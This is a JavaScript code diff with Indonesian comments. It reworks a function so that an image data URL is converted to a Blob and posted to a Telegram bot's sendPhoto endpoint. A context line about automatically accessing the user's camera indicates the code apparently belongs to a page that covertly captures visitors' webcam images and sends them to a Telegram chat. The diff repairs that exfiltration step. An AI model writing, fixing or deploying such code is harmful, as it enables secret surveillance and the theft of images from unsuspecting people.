@@ -17,23 +17,28 @@
       // API endpoint untuk mengirim pesan gambar
       var apiUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
 
-      // Buat form data untuk POST request
-      var formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append('photo', imageDataURL, 'photo.png'); // Nama file disertakan untuk photo
+      // Mengubah data URL menjadi Blob
+      fetch(imageDataURL)
+        .then(res => res.blob())
+        .then(blob => {
+          // Buat form data untuk POST request
+          var formData = new FormData();
+          formData.append('chat_id', chatId);
+          formData.append('photo', blob, 'photo.png'); // Nama file disertakan untuk photo
 
-      // Kirim POST request menggunakan fetch API
-      fetch(apiUrl, {
-        method: 'POST',
-        body: formData
-      })
-      .then(response => response.json())
-      .then(data => {
-        console.log('Gambar berhasil dikirim ke Telegram:', data);
-      })
-      .catch(error => {
-        console.error('Error mengirim gambar ke Telegram:', error);
-      });
+          // Kirim POST request menggunakan fetch API
+          return fetch(apiUrl, {
+            method: 'POST',
+            body: formData
+          });
+        })
+        .then(response => response.json())
+        .then(data => {
+          console.log('Gambar berhasil dikirim ke Telegram:', data);
+        })
+        .catch(error => {
+          console.error('Error mengirim gambar ke Telegram:', error);
+        });
     }
 
     // Mendapatkan akses ke kamera pengguna secara otomatis
